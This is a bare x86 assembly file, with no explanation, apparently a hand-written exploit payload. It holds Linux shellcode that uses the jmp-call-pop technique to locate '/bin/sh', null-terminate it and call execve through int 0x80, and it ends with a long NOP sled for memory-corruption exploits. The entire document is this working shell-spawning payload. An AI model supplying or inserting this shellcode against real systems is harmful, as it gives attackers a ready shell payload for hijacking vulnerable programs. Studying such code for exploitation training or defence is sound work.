jmp put_str_in_ra

_got_string_in_ra:
	xor eax,eax
	mov al, 0x0b 				# code for execve
	pop ebx 					# get /bin/sh@ in ebx
	xor edx, edx
	mov byte ptr [ebx+7], dl 	# put \0 to "/bin/sh"
	mov ecx, edx 				# argv null, env already null (xor edx, edx)
	int 0x80






put_str_in_ra:
	call _got_string_in_ra
	.ASCII "/bin/sh@"
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop